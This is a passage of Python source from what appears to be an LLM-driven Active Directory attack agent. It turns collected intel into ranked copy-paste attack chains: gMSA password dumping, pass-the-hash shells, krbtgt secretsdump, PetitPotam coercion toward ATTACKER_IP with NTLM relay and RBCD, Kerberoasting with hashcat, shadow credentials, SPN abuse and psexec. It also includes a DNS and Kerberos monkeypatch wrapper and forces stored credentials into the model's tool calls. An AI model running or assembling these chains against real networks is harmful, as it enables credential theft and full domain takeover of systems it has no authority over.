    dict_keys = ["nt_hashes", "gmsa_hashes"]
    bool_keys = ["pwn3d", "is_da", "ntlm_disabled", "adcs_shell_ready", "bloodhound_failed_nonblocking"]

    for key in list_keys:
        current = store.setdefault(key, [])
        for item in intel.get(key, []):
            if key == "acl_paths" and isinstance(item, (list, tuple)) and len(item) == 2:
                item = (item[0], _canonical_acl_target(item[1]))
            if item not in current:
                current.append(item)

    for key in dict_keys:
        current = store.setdefault(key, {})
        current.update(intel.get(key, {}))

    for key in bool_keys:
        store[key] = bool(store.get(key) or intel.get(key))


def _agent_intel() -> dict:
    """Return persisted agent intel with stable defaults."""
    defaults = {
        "users": [], "computers": [], "spns": [], "asrep_users": [], "admin_users": [],
        "esc_vulns": [], "winrm_access": [], "winrm_targets": [], "readable_shares": [],
        "creds_in_files": [], "acl_paths": [], "script_path_edges": [], "delegation": [],
        "ccaches": [], "flags": [], "valid_creds": [], "validated_creds": [],
        "wsus_servers": [],
        "local_privesc_hints": [], "gmsa_candidates": [],
        "gmsa_read_dead_for": [], "gmsa_read_tried_for": [],
        "acl_scan_dead_for": [], "desc_passwords": [], "valid_creds_tested": [],
        "nt_hashes": {}, "gmsa_hashes": {},
        "pwn3d": False, "is_da": False, "ntlm_disabled": False,
        "adcs_shell_ready": False, "adcs_ccache": "",
        "bloodhound_failed_nonblocking": False,
        "last_adcs_scan_used_kerberos": False,
        "last_adcs_needs_retry_after_tgt": False,
    }
    stored = SESSION.get("agent_intel", {})
    merged = {k: stored.get(k, v) for k, v in defaults.items()}
    merged["acl_paths"] = [
        (right, _canonical_acl_target(target)) for right, target in merged.get("acl_paths", [])
        if _valid_ad_target(target) or str(target).endswith("$")
    ]
    return merged


def _bloodhound_objects(object_type: str = "") -> list[dict]:
    """Read locally collected BloodHound JSON objects without requiring Neo4j."""
    roots = [
        Path(SESSION.get("output_dir") or str(OUTPUT_DIR)) / "bloodhound",
        AGENT_RUNTIME_DIR,
        Path("/tmp/agent_bloodhound"),
    ]
    objects: list[dict] = []
    suffix = f"_{object_type}.json" if object_type else ".json"
    for root in roots:
        if not root.exists():
            continue
        for path in sorted(root.glob(f"*{suffix}")):
            try:
                payload = json.loads(path.read_text(errors="ignore"))
            except Exception:
                continue
            for item in payload.get("data", []) if isinstance(payload, dict) else []:
                if isinstance(item, dict):
                    objects.append(item)
    return objects


def _known_computer_accounts() -> list[str]:
    """Return computer sAMAccountNames known from intel and BloodHound JSON."""
    names: list[str] = []
    intel = SESSION.get("agent_intel", {}) or {}
    for value in intel.get("computers", []) or []:
        sam = str(value or "").strip().split("@")[0].upper()
        if sam and not sam.endswith("$"):
            sam += "$"
        if sam and sam not in names:
            names.append(sam)
    for item in _bloodhound_objects("computers"):
        props = item.get("Properties", {}) or {}
        for raw in (props.get("samaccountname"), props.get("name")):
            sam = str(raw or "").strip().split("@")[0].upper()
            if "." in sam:
                sam = sam.split(".")[0]
            if sam and not sam.endswith("$"):
                sam += "$"
            if sam and re.fullmatch(r"[A-Z0-9_.-]{2,63}\$", sam) and sam not in names:
                names.append(sam)
    return names


def _known_gmsa_accounts() -> list[str]:
    """Return gMSA/service managed accounts from intel and BloodHound JSON."""
    names: list[str] = []
    intel = SESSION.get("agent_intel", {}) or {}
    raw_candidates = [
        v for v in (intel.get("gmsa_candidates", []) or [])
        if "gmsa" in str(v).lower()
    ] + list((intel.get("gmsa_hashes", {}) or {}).keys())
    for value in raw_candidates:
        sam = str(value or "").strip().split("@")[0]
        if sam and not sam.endswith("$"):
            sam += "$"
        if sam and "gmsa" in sam.lower() and sam not in names:
            names.append(sam)
    for item in _bloodhound_objects("users"):
        props = item.get("Properties", {}) or {}
        dn = str(props.get("distinguishedname") or "").lower()
        sam = str(props.get("samaccountname") or props.get("name") or "").strip().split("@")[0]
        if "managed service accounts" not in dn and "gmsa" not in sam.lower():
            continue
        if sam and not sam.endswith("$"):
            sam += "$"
        if sam and sam not in names:
            names.append(sam)
    return names


def _attacker_ip() -> str:
    """Return configured listener IP, or infer it from attacker_iface."""
    ip = str(SESSION.get("attacker_ip") or "").strip()
    if ip:
        return ip
    iface = str(SESSION.get("attacker_iface") or "").strip()
    if not iface:
        return ""
    try:
        out = subprocess.check_output(
            ["ip", "-4", "-o", "addr", "show", "dev", iface],
            text=True,
            stderr=subprocess.DEVNULL,
            timeout=2,
        )
    except Exception:
        return ""
    m = re.search(r"\binet\s+(\d+\.\d+\.\d+\.\d+)/", out)
    if not m:
        return ""
    ip = m.group(1)
    SESSION["attacker_ip"] = ip
    return ip


def _shell_export_prefix() -> list[str]:
    dc = SESSION.get("dc_ip", "<dc_ip>")
    dom = SESSION.get("domain", "<domain>")
    dc_fqdn = _dc_host_for_kerberos(dom, dc) if dom and dc else "<dc_fqdn>"
    attacker = _attacker_ip() or "<attacker_ip>"
    return [
        f"export DC_IP={dc}",
        f"export DOMAIN={dom}",
        f"export REALM={str(dom).upper()}",
        f"export DC_HOST={dc_fqdn}",
        f"export ATTACKER_IP={attacker}",
        "export TARGET_COMPUTER='<target_computer_sam_without_$>'",
        "export TARGET_HOST='<target_host_fqdn_or_ip>'",
        "export TARGET_IP='<target_host_ip_if_needed>'",
    ]


def _auth_material_for_commands(username: str = "", password: str = "", nt_hash: str = "") -> tuple[str, str]:
    """Return (user, auth snippet) for command suggestions."""
    user = username or SESSION.get("username", "<user>")
    password = _real_secret(password or SESSION.get("password", ""))
    nt_hash = _real_nt_hash(nt_hash or SESSION.get("nt_hash", ""))
    if nt_hash:
        return user, f"-hashes :{nt_hash}"
    if password:
        return user, f"-p {shell_quote(password)}"
    return user, "-p '<password_or_hash>'"


def build_attack_chain_plan() -> list[dict]:
    """Turn collected evidence into ranked, copy-paste command chains."""
    intel = _agent_intel()
    dc = SESSION.get("dc_ip", "<dc_ip>")
    dom = SESSION.get("domain", "<domain>")
    dc_host = _dc_host_for_kerberos(dom, dc) if dom and dc else "<dc_fqdn>"
    plans: list[dict] = []
    prefix = _shell_export_prefix()

    valid_creds = list(intel.get("valid_creds", []) or [])
    gmsa_hashes = _valid_gmsa_hashes(intel.get("gmsa_hashes", {}) or {})
    gmsa_candidates = _known_gmsa_accounts()
    computers = _known_computer_accounts()
    pre2k_creds = [
        c for c in valid_creds
        if str(c.get("user", "")).endswith("$") and _real_secret(c.get("password", ""))
    ]
    actionable_acl_paths = [
        (right, target) for right, target in (intel.get("acl_paths", []) or [])
        if _valid_ad_target(str(target))
        and not _same_ad_account(str(target), SESSION.get("username", ""))
    ]

    if gmsa_candidates and not gmsa_hashes:
        commands = prefix + [
            "# Test legacy pre-Windows 2000 machine passwords, then read gMSA passwords",
            "python3 -m pip show pre2k >/dev/null 2>&1 || python3 -m pip install --user pre2k",
            "pre2k unauth -d $DOMAIN -dc-ip $DC_IP",
        ]
        for sam in (pre2k_creds or [{"user": c, "password": c.rstrip("$").lower()} for c in computers[:3]]):
            acct = sam["user"] if isinstance(sam, dict) else str(sam)
            pw = sam.get("password", acct.rstrip("$").lower()) if isinstance(sam, dict) else acct.rstrip("$").lower()
            commands.append(
                f"python3 tools/bin/gMSADumper.py -u {shell_quote(acct)} "
                f"-p {shell_quote(pw)} -d $DOMAIN -l $DC_IP"
            )
        plans.append({
            "title": "Pre2K machine account -> gMSA password read",
            "confidence": "high" if computers or pre2k_creds else "medium",
            "why": f"gMSA accounts discovered: {', '.join(gmsa_candidates[:4])}",
            "commands": commands,
        })

    if gmsa_hashes:
        acct, nth = next(iter(gmsa_hashes.items()))
        plans.append({
            "title": "gMSA hash -> shell / pivot",
            "confidence": "high",
            "why": f"NT hash recovered for {acct}",
            "commands": prefix + [
                f"nxc winrm $DC_HOST -d $DOMAIN -u {shell_quote(acct)} -H {nth}",
                f"evil-winrm -i $DC_HOST -r $REALM -u {shell_quote(acct)} -H {nth}",
                f"impacket-secretsdump $DOMAIN/{shell_quote(acct)}@$DC_HOST -hashes :{nth} -just-dc-user krbtgt",
            ],
        })

    if pre2k_creds and computers:
        machine = pre2k_creds[0]["user"]
        mpw = pre2k_creds[0]["password"]
        target_computers = [c.rstrip("$") for c in computers if c != str(machine).upper()]
        target_hint = target_computers[0] if target_computers else "<target_computer>"
        plans.append({
            "title": "Machine account -> NTLM relay RBCD -> target host admin",
            "confidence": "medium",
            "why": f"Controlled machine account available: {machine}",
            "commands": prefix + [
                f"export TARGET_COMPUTER={shell_quote(target_hint)}",
                "sudo sysctl -w net.ipv4.ip_forward=1",
                "impacket-ntlmrelayx -t ldaps://$DC_IP --delegate-access "
                f"--escalate-user {shell_quote(machine)} --smb2support",
                f"python3 tools/PetitPotam/PetitPotam.py -d $DOMAIN "
                f"-u {shell_quote(machine)} -p {shell_quote(mpw)} $ATTACKER_IP $TARGET_HOST",
                f"impacket-getST -dc-ip $DC_IP -spn cifs/$TARGET_COMPUTER.$DOMAIN "
                f"-impersonate Administrator $DOMAIN/{shell_quote(machine)}:{shell_quote(mpw)}",
                "export KRB5CCNAME=Administrator.ccache",
                "impacket-secretsdump -k -no-pass $TARGET_COMPUTER.$DOMAIN -target-ip $TARGET_IP",
            ],
        })

    if intel.get("spns"):
        user, auth = _auth_material_for_commands()
        plans.append({
            "title": "Kerberoast -> crack -> validate credential",
            "confidence": "medium",
            "why": f"SPN accounts discovered: {', '.join(map(str, intel.get('spns', [])[:4]))}",
            "commands": prefix + [
                f"impacket-GetUserSPNs $DOMAIN/{shell_quote(user)} {auth} "
                "-dc-ip $DC_IP -request -outputfile output/agent_runtime/kerberoast.hashes",
                "hashcat -m 13100 output/agent_runtime/kerberoast.hashes "
                "/usr/share/wordlists/rockyou.txt --show",
                "nxc smb $DC_IP -d $DOMAIN -u '<cracked_user>' -p '<cracked_password>'",
                "nxc winrm $DC_HOST -d $DOMAIN -u '<cracked_user>' -p '<cracked_password>'",
            ],
        })

    if actionable_acl_paths:
        right, target = actionable_acl_paths[0]
        user, auth = _auth_material_for_commands()
        commands = prefix + [
            f"# Evidence: {right} on {target}",
            "bloodhound-python -d $DOMAIN -u "
            f"{shell_quote(user)} {auth} -dc $DC_HOST -ns $DC_IP -c All --zip -o output/bloodhound",
        ]
        if str(target).endswith("$"):
            commands += [
                f"impacket-rbcd -delegate-from '<controlled_computer>$' "
                f"-delegate-to {shell_quote(str(target).rstrip('$'))} "
                f"$DOMAIN/{shell_quote(user)}:'<password>' -dc-ip $DC_IP -action write",
                f"impacket-getST -spn cifs/{str(target).rstrip('$').lower()}.$DOMAIN "
                "-impersonate Administrator $DOMAIN/'<controlled_computer>$':'<computer_password>' "
                "-dc-ip $DC_IP",
            ]
        else:
            commands += [
                f"certipy shadow add -u {shell_quote(user)}@${{DOMAIN}} "
                f"-p '<password>' -target {shell_quote(str(target))} -dc-ip $DC_IP",
                f"bloodyAD -d $DOMAIN --host $DC_IP -u {shell_quote(user)} "
                f"-p '<password>' get object {shell_quote(str(target))}",
            ]
        plans.append({
            "title": "ACL edge abuse path",
            "confidence": "medium",
            "why": f"{right} on {target}",
            "commands": commands,
        })

    spn_write_edges = [
        (right, target) for right, target in actionable_acl_paths
        if any(token in str(right).lower() for token in (
            "writespn", "serviceprincipalname",
        ))
    ]
    if spn_write_edges:
        right, target = spn_write_edges[0]
        user, auth = _auth_material_for_commands()
        target_sam = str(target).strip().strip("'\"")
        target_host = target_sam.rstrip("$").lower()
        plans.append({
            "title": "SPN write edge -> targeted Kerberoast / S4U pivot",
            "confidence": "medium",
            "why": f"{right} on {target_sam}",
            "commands": prefix + [
                f"export SPN_TARGET={shell_quote(target_sam)}",
                f"python3 tools/krbrelayx/addspn.py -u \"$DOMAIN\\\\{user}\" "
                f"{auth} -t \"$SPN_TARGET\" -s \"HTTP/{target_host}\" $DC_IP",
                f"impacket-GetUserSPNs $DOMAIN/{shell_quote(user)} {auth} "
                "-dc-ip $DC_IP -request-user \"$SPN_TARGET\" "
                "-outputfile output/agent_runtime/targeted_spn.hash",
                "hashcat -m 13100 output/agent_runtime/targeted_spn.hash "
                "/usr/share/wordlists/rockyou.txt --show",
                "# If the controlled account is trusted to delegate, request S4U to a real service:",
                "impacket-getST -spn \"HTTP/$TARGET_COMPUTER.$DOMAIN\" "
                "-impersonate Administrator $DOMAIN/'<delegating_account>':'<password_or_hash>' "
                "-dc-ip $DC_IP -altservice \"CIFS/$DC_HOST\"",
                "export KRB5CCNAME='<administrator_cifs_dc_ccache>'",
                "impacket-psexec -k -no-pass $DC_HOST",
            ],
        })

    if not plans:
        plans.append({
            "title": "Baseline AD solve loop",
            "confidence": "low",
            "why": "No concrete exploit edge yet; collect graph and high-signal credential material",
            "commands": prefix + [
                "nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 $DC_IP",
                "nxc smb $DC_IP -d $DOMAIN -u '<user>' -p '<password>' --shares",
                "nxc ldap $DC_IP -d $DOMAIN -u '<user>' -p '<password>' --gmsa",
                "impacket-GetUserSPNs $DOMAIN/'<user>':'<password>' -dc-ip $DC_IP -request",
                "certipy find -u '<user>@'$DOMAIN -p '<password>' -dc-ip $DC_IP -vulnerable -stdout",
                "bloodhound-python -d $DOMAIN -u '<user>' -p '<password>' -dc $DC_HOST -ns $DC_IP -c All --zip",
            ],
        })
    return plans[:5]


def tool_chain_planner(dc_ip: str = "", domain: str = "") -> str:
    """Generate ranked attack chains and copy-paste commands from collected intel."""
    if dc_ip:
        SESSION["dc_ip"] = dc_ip
    if domain:
        SESSION["domain"] = domain
    plans = build_attack_chain_plan()
    blocks = ["=== Attack Chain Planner ==="]
    for idx, plan in enumerate(plans, 1):
        blocks += [
            f"\n[{idx}] {plan['title']}  confidence={plan['confidence']}",
            f"Why: {plan['why']}",
            "Commands:",
            *plan["commands"][:24],
        ]
    return "\n".join(blocks)


def _valid_dc_fqdn(domain: str, fallback: str = "") -> str:
    """Return session DC FQDN only if it belongs to the active domain."""
    fqdn = str(SESSION.get("dc_fqdn") or "").strip().lower()
    dom = str(domain or SESSION.get("domain", "")).strip().lower()
    if fqdn and dom and (fqdn == dom or fqdn.endswith("." + dom)):
        return fqdn
    if fqdn and dom and not fqdn.endswith("." + dom):
        warn(f"[Agent] Ignoring stale dc_fqdn '{fqdn}' for active domain '{dom}'")
        SESSION["dc_fqdn"] = ""
    return fallback

def _dc_host_for_kerberos(domain: str, dc_ip: str = "") -> str:
    """Return an FQDN suitable for Kerberos SPNs; never return a raw IP."""
    dom = str(domain or SESSION.get("domain", "")).strip().lower()
    fqdn = _valid_dc_fqdn(dom) or str(SESSION.get("dc_fqdn") or "").strip().lower()
    if fqdn and not re.fullmatch(r"\d{1,3}(?:\.\d{1,3}){3}", fqdn):
        return fqdn
    host = str(SESSION.get("dc_hostname") or "").strip().lower()
    if host and dom:
        return host if host.endswith("." + dom) else f"{host}.{dom}"
    dc = str(dc_ip or SESSION.get("dc_ip", "")).strip()
    if dc and dom:
        try:
            out = _run(f"nxc smb {shell_quote(dc)}", timeout=10)
            m = re.search(r"\(name:([^)]+)\).*?\(domain:([^)]+)\)", out, re.I)
            if m:
                SESSION["dc_hostname"] = m.group(1).lower()
                return f"{m.group(1).lower()}.{dom}"
        except Exception:
            pass
    return f"dc.{dom}" if dom else dc

def _bloodyad_auth(domain: str, username: str, password: str = "",
                  nt_hash: str = "", dc_ip: str = "") -> tuple[str, dict]:
    """Build bloodyAD auth args with hostname in --host and IP in --dc-ip."""
    dom = domain or SESSION.get("domain", "")
    dc = dc_ip or SESSION.get("dc_ip", "")
    host = _dc_host_for_kerberos(dom, dc)
    dc_arg = f" -i {shell_quote(dc)}" if dc else ""
    env = os.environ.copy()
    if nt_hash:
        nt = nt_hash.split(":")[-1]
        env.pop("KRB5CCNAME", None)
        env.pop("KRB5_CONFIG", None)
        return (
            f"-H {shell_quote(host)}{dc_arg} "
            f"-d {shell_quote(dom)} -u {shell_quote(username)} -p :{shell_quote(nt)}",
            env,
        )
    if _real_secret(password):
        env.pop("KRB5CCNAME", None)
        env.pop("KRB5_CONFIG", None)
        return (
            f"-H {shell_quote(host)}{dc_arg} "
            f"-d {shell_quote(dom)} -u {shell_quote(username)} -p {shell_quote(password)}",
            env,
        )
    if _session_kerberos_usable(username, dom):
        env["KRB5CCNAME"] = SESSION["krb5_ccache"]
        if SESSION.get("krb5_config"):
            env["KRB5_CONFIG"] = SESSION["krb5_config"]
        return (
            f"-k ccache={shell_quote(SESSION['krb5_ccache'])} "
            f"-H {shell_quote(host)}{dc_arg} "
            f"-d {shell_quote(dom)} -u {shell_quote(username)}",
            env,
        )
    return "", env

def _target_krb5_config(dc_ip: str, domain: str, dc_fqdn: str = "") -> str:
    """Write and activate a per-target krb5.conf for the active lab target."""
    dom = str(domain or SESSION.get("domain", "")).strip().lower()
    if not dom:
        return SESSION.get("krb5_config", "")
    dc = str(dc_ip or SESSION.get("dc_ip", "")).strip()
    fqdn = (dc_fqdn or _valid_dc_fqdn(dom) or _dc_host_for_kerberos(dom, dc)).strip().lower()
    host = fqdn.split(".")[0] if fqdn else "dc01"
    realm = dom.upper()
    conf_path = str(_runtime_path(f"krb5_{dom}.conf"))
    kdc_value = dc or fqdn
    krb5_conf = f"""[libdefaults]
    default_realm = {realm}
    dns_lookup_realm = false
    dns_lookup_kdc = false
    dns_canonicalize_hostname = false
    rdns = false
    ticket_lifetime = 24h
    forwardable = true
    noaddresses = true
    udp_preference_limit = 1

[realms]
    {realm} = {{
        kdc = {kdc_value}
        admin_server = {kdc_value}
        default_domain = {dom}
    }}

[domain_realm]
    .{dom} = {realm}
    {dom} = {realm}
    {fqdn} = {realm}
    {host} = {realm}
"""
    try:
        Path(conf_path).parent.mkdir(parents=True, exist_ok=True)
        Path(conf_path).write_text(krb5_conf)
    except (PermissionError, OSError):
        # Fallback 1: alternate runtime path
        try:
            alt_path = _runtime_path(f"krb5_{dom}_{os.getuid()}.conf")
            alt_path.parent.mkdir(parents=True, exist_ok=True)
            alt_path.write_text(krb5_conf)
            conf_path = str(alt_path)
        except (PermissionError, OSError):
            # Fallback 2: /tmp — always writable
            tmp_path = Path("/tmp") / f"adstrike_krb5_{dom}_{os.getuid()}.conf"
            tmp_path.write_text(krb5_conf)
            conf_path = str(tmp_path)
    SESSION["krb5_config"] = conf_path
    os.environ["KRB5_CONFIG"] = conf_path
    return conf_path

def _bloodhound_ipv4_wrapper() -> str:
    """Create a small launcher that forces BloodHound.py DC A lookup to IPv4."""
    wrapper = _runtime_path("adstrike_bloodhound_ipv4.py")
    wrapper.write_text(r'''#!/usr/bin/env python3
import os
import sys
import socket
import dns.resolver

host = os.environ.get("ADSTRIKE_BH_HOST", "").strip().lower().rstrip(".")
domain = os.environ.get("ADSTRIKE_BH_DOMAIN", "").strip().lower().rstrip(".")
ip = os.environ.get("ADSTRIKE_BH_IP", "").strip()

_orig_resolve = dns.resolver.Resolver.resolve
_orig_query = dns.resolver.Resolver.query
_orig_getaddrinfo = socket.getaddrinfo
_orig_gethostbyname = socket.gethostbyname
_orig_gethostbyname_ex = socket.gethostbyname_ex

class _ARecord:
    def __init__(self, address):
        self.address = address
    def __str__(self):
        return self.address

class _SRVRecord:
    def __init__(self, target):
        self.target = target.rstrip(".") + "."
        self.port = 389
        self.priority = 0
        self.weight = 100
    def __str__(self):
        return "0 100 389 %s" % self.target

class _Answer(list):
    def __init__(self, records, qname):
        super().__init__(records)
        self.qname = str(qname).rstrip(".") + "."

def _matches(qname):
    q = str(qname).strip().lower().rstrip(".")
    names = {n for n in (host, domain, host.split(".")[0] if host else "") if n}
    return q in names

def _matches_ad_srv(qname):
    q = str(qname).strip().lower().rstrip(".")
    if not host:
        return False
    known = (
        q.startswith("_ldap._tcp.pdc._msdcs.")
        or q.startswith("_ldap._tcp.gc._msdcs.")
        or q.startswith("_kerberos._tcp.dc._msdcs.")
    )
    if known and "._msdcs." in q:
        return True
    return (
        q == "_ldap._tcp.pdc._msdcs.%s" % domain
        or q == "_ldap._tcp.gc._msdcs.%s" % domain
        or q == "_kerberos._tcp.dc._msdcs.%s" % domain
        or (known and q.endswith("." + domain))
    )

def _forced_answer(rdtype):
    try:
        rd = dns.rdatatype.to_text(rdtype).upper()
    except Exception:
        rd = str(rdtype or "A").upper()
    if rd == "A" and ip:
        return _Answer([_ARecord(ip)], host or domain)
    if rd == "AAAA" and ip:
        raise dns.resolver.NoAnswer()
    return None

def _forced_srv_answer(qname, rdtype):
    try:
        rd = dns.rdatatype.to_text(rdtype).upper()
    except Exception:
        rd = str(rdtype or "").upper()
    if rd == "SRV" and host and _matches_ad_srv(qname):
        return _Answer([_SRVRecord(host)], qname)
    return None

def resolve(self, qname, rdtype=dns.rdatatype.A, *args, **kwargs):
    srv = _forced_srv_answer(qname, rdtype)
    if srv is not None:
        return srv
    if _matches(qname):
        ans = _forced_answer(rdtype)
        if ans is not None:
            return ans
    return _orig_resolve(self, qname, rdtype, *args, **kwargs)

def query(self, qname, rdtype=dns.rdatatype.A, *args, **kwargs):
    srv = _forced_srv_answer(qname, rdtype)
    if srv is not None:
        return srv
    if _matches(qname):
        ans = _forced_answer(rdtype)
        if ans is not None:
            return ans
    return _orig_query(self, qname, rdtype, *args, **kwargs)

dns.resolver.Resolver.resolve = resolve
dns.resolver.Resolver.query = query

def getaddrinfo(name, port, family=0, type=0, proto=0, flags=0):
    if ip and _matches(name):
        family = socket.AF_INET
        return _orig_getaddrinfo(ip, port, family, type, proto, flags)
    return _orig_getaddrinfo(name, port, family, type, proto, flags)

def gethostbyname(name):
    if ip and _matches(name):
        return ip
    return _orig_gethostbyname(name)

def gethostbyname_ex(name):
    if ip and _matches(name):
        canon = host or domain or name
        return (canon, [], [ip])
    return _orig_gethostbyname_ex(name)

socket.getaddrinfo = getaddrinfo
socket.gethostbyname = gethostbyname
socket.gethostbyname_ex = gethostbyname_ex

try:
    import logging
    from bloodhound.ad.domain import ADDC

    _orig_ldap_connect = ADDC.ldap_connect

    def ldap_connect(self, protocol=None, resolver=False):
        if ip and _matches(getattr(self, "hostname", "")):
            if not protocol:
                protocol = self.ad.ldap_default_protocol
            logging.info("Connecting to LDAP server: %s", self.hostname)
            logging.debug("Using forced LDAP server IPv4: %s", ip)
            ldap = self.ad.auth.getLDAPConnection(
                hostname=self.hostname,
                ip=ip,
                baseDN=self.ad.baseDN,
                protocol=protocol,
            )
            if resolver:
                self.resolverldap = ldap
            else:
                self.ldap = ldap
            return ldap is not None
        return _orig_ldap_connect(self, protocol=protocol, resolver=resolver)

    ADDC.ldap_connect = ldap_connect
except Exception:
    pass

# Patch impacket's getKerberosTGS to use ccache-cached TGS when available.
# bloodhound-python always calls getKerberosTGS even when the ccache already
# has a valid ldap/<dc> service ticket.  That live KDC call fails when the
# local clock is skewed (KDC_AP_ERR_SKEW).  By returning the cached TGS we
# bypass the KDC entirely and the LDAP bind succeeds.
try:
    from impacket.krb5 import kerberosv5 as _kv5
    from impacket.krb5.ccache import CCache as _CCache
    _orig_getKerberosTGS = _kv5.getKerberosTGS

    def _cached_getKerberosTGS(serverName, domain, kdcHost, tgt, cipher, sessionKey):
        ccache_path = os.environ.get("KRB5CCNAME", "")
        if ccache_path and os.path.exists(ccache_path):
            try:
                cc = _CCache.loadFile(ccache_path)
                # serverName may be a PrincipalName ASN1 object or a string
                sname = str(serverName).lower().rstrip(".")
                for cred in cc.credentials:
                    try:
                        srv = str(cred.header["server"]).lower().rstrip(".")
                    except Exception:
                        continue
                    # Match exact SPN or prefix (e.g. "ldap/dc01.corp.local" in
                    # "ldap/dc01.corp.local@CORP.LOCAL")
                    if srv == sname or srv.split("@")[0] == sname.split("@")[0]:
                        tgs_tuple = cred.toTGS()
                        # toTGS() returns a dict with KDC_REP / cipher / sessionKey
                        if isinstance(tgs_tuple, dict):
                            return (
                                tgs_tuple.get("KDC_REP"),
                                tgs_tuple.get("cipher", cipher),
                                None,
                                tgs_tuple.get("sessionKey", sessionKey),
                            )
            except Exception:
                pass
        return _orig_getKerberosTGS(serverName, domain, kdcHost, tgt, cipher, sessionKey)

    _kv5.getKerberosTGS = _cached_getKerberosTGS
except Exception:
    pass

from bloodhound import main
sys.exit(main())
''')
    wrapper.chmod(0o755)
    return str(wrapper)


def _sanitize_tool_inputs(name: str, inputs: dict) -> dict:
    """
    Normalize model-supplied tool inputs and force authoritative session values
    for credentials and target identity. This keeps both Claude and Ollama paths
    consistent and prevents placeholders from reaching tool handlers.
    """
    inputs = dict(inputs or {})

    _sess_dc   = SESSION.get("dc_ip", "")
    _sess_dom  = SESSION.get("domain", "")
    _sess_usr  = SESSION.get("username", "")
    _sess_pw   = _real_secret(SESSION.get("password", ""))
    _sess_hash = _real_nt_hash(SESSION.get("nt_hash", ""))
    _placeholder_re = re.compile(r'^<[^>]+>$')
    def _valid_target(value) -> bool:
        return _valid_ad_target(value)

    def _best_acl_target():
        for right, target in _agent_intel().get("acl_paths", []):
            if _valid_target(target):
                return str(target).strip().strip("'\"")
        return ""

    for k in list(inputs.keys()):
        v = str(inputs[k])
        if _placeholder_re.match(v) or v in ("", "None", "null", "undefined"):
            inputs.pop(k)

    if "username" in inputs and "@" in str(inputs.get("username", "")):
        inputs["username"] = str(inputs["username"]).split("@")[0]

    # ── Self-attack guard ───────────────────────────────────────────────────
    # When the LLM has no real ACL evidence, qwen2.5-coder:7b often fills
    # target_user/target_account/target_gmsa with the attacking username.
    # That always fails (you can't write your own SPN, modify your own
    # msDS-GroupMSAMembership, etc.) and burns rounds. Strip it so the
    # tool-specific block below either substitutes a real target from
    # _agent_intel().acl_paths or pops the field, forcing an error the
    # agent can pivot from instead of an opaque bloodyAD traceback.
    _self_target_keys = ("target_user", "target_account", "target_gmsa", "target")
    _attacker_lower = (_sess_usr or "").lower().strip("\\/@$")
    if _attacker_lower:
        for _k in _self_target_keys:
            if name == "pass_the_cert" and _k == "target_user":
                continue
            _v = str(inputs.get(_k, "")).lower().strip("\\/@$")
            # Strip DOMAIN\ or @realm decorations before comparing.
            _v_stem = _v.split("\\")[-1].split("@")[0]
            if _v_stem and _v_stem == _attacker_lower:
                inputs.pop(_k, None)

    if "domain" in inputs:
        dom_val = str(inputs["domain"])
        if "@" in dom_val:
            dom_val = dom_val.split("@")[-1]
        inputs["domain"] = dom_val.replace("\\", "").strip()
        if len(inputs["domain"]) < 3 and _sess_dom:
            inputs["domain"] = _sess_dom

    tool_schema = next((t["input_schema"] for t in TOOLS if t["name"] == name), {})
    accepted_keys = set(tool_schema.get("properties", {}).keys())

    if "password" in accepted_keys:
        supplied_pw = _real_secret(inputs.get("password", ""))
        supplied_user = str(inputs.get("username", "")).strip()
        # Preserve explicit per-credential passwords for validation/pivot tools.
        # Otherwise a discovered credential such as jane.smith:Welcome123 is
        # silently paired with the original session password.
        if (supplied_pw and supplied_user and _sess_usr
                and not _same_ad_account(supplied_user, _sess_usr)
                and name in {"test_credential", "discover_winrm_access", "evil_winrm",
                             "enumerate_ldap", "enumerate_shares", "collect_bloodhound",
                             "acl_abuse_scan", "gmsa_read"}):
            inputs["password"] = supplied_pw
        else:
            inputs["password"] = _sess_pw
    # Do NOT inject NT hash when:
    # - caller explicitly set nt_hash="" (Kerberos-only mode after ADCS exploit)
    # - NTLM is disabled and Kerberos is active (hash would fail anyway)
    _krb_active = SESSION.get("use_kerberos") and SESSION.get("krb5_ccache")
    _ntlm_off   = SESSION.get("ntlm_disabled")
    _explicit_empty_hash = "nt_hash" in inputs and inputs["nt_hash"] == ""
    if "nt_hash" in accepted_keys and not inputs.get("nt_hash") and not _explicit_empty_hash:
        if not (_krb_active and _ntlm_off):
            inputs["nt_hash"] = _sess_hash
    if "attacker_pass" in accepted_keys:
        inputs["attacker_pass"] = _sess_pw
    if "attacker_user" in accepted_keys and not _valid_target(inputs.get("attacker_user")):
        inputs["attacker_user"] = _sess_usr

    authoritative = {
        "dc_ip":    _sess_dc,
        "domain":   _sess_dom,
    }
    for k, v in authoritative.items():
        if k in accepted_keys and v:
            inputs[k] = v

    session_identity_tools = {
        "enumerate_ldap", "enumerate_shares", "collect_bloodhound",
        "asrep_roast", "kerberoast", "adcs_scan", "acl_abuse_scan",
            "force_change_password_pivot", "logon_script_abuse", "credential_loot",
            "auto_loot_chain", "request_tgt", "windows_privesc_recon",
            "gmsa_takeover",
            "discover_winrm_access",
    }
    explicit_pivot_user = (
        "username" in inputs
        and str(inputs.get("username", "")).strip()
        and not _placeholder_re.match(str(inputs.get("username", "")))
        and not _same_ad_account(str(inputs.get("username", "")), _sess_usr)
    )
    if ("username" in accepted_keys
            and (name in session_identity_tools
                 or not inputs.get("username")
                 or _placeholder_re.match(str(inputs.get("username", ""))))
            and not (name == "gmsa_read" and explicit_pivot_user)
            and _sess_usr):
        inputs["username"] = _sess_usr

    # If the selected username has a known NT hash in loot/intel, use that
    # identity's hash instead of blindly pairing it with the session password.
    # This is essential for generic gMSA/computer-account pivots.
    if name in {"evil_winrm", "discover_winrm_access", "lateral_movement",
                "windows_privesc_recon", "test_credential"}:
        selected_user = str(inputs.get("username") or "").strip()
        selected_hash = _hash_for_account(selected_user)
        if selected_hash and "nt_hash" in accepted_keys:
            inputs["nt_hash"] = selected_hash
            if "password" in accepted_keys:
                inputs["password"] = ""

    if ("target_ip" in accepted_keys
            and (not inputs.get("target_ip")
                 or _placeholder_re.match(str(inputs.get("target_ip", ""))))
            and _sess_dc):
        inputs["target_ip"] = _sess_dc

    if name == "shadow_credentials_attack":
        if not _valid_target(inputs.get("target_account")):
            target = _best_acl_target()
            if target:
                inputs["target_account"] = target

    if name == "targeted_kerberoast":
        supplied = str(inputs.get("target_user", "")).strip().strip("'\"")
        allowed_rights = ("genericwrite", "writeproperty", "genericall", "writespn")
        supplied_has_evidence = bool(
            _real_user_target(supplied)
            and not _same_ad_account(supplied, _sess_usr)
